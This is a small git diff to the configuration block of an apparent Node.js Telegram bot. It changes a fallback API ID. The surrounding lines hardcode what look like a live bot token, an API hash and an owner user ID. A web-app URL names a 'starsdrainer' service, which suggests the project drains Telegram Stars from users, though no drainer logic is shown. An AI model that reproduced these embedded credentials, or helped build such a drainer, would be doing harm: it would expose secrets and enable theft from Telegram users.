@@ -12,7 +12,7 @@ process.env.NTBA_FIX_350 = "1";
 process.env.NTBA_FIX_319 = "1";
 
 const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
-const API_ID = parseInt(process.env.API_ID) || 32865720;
+const API_ID = parseInt(process.env.API_ID) || 2834;
 const API_HASH = process.env.API_HASH || 'aa86943502451690495bb18ecd230825';
 const MY_USER_ID = 1398396668;
 const WEB_APP_URL = 'https://starsdrainer.onrender.com';
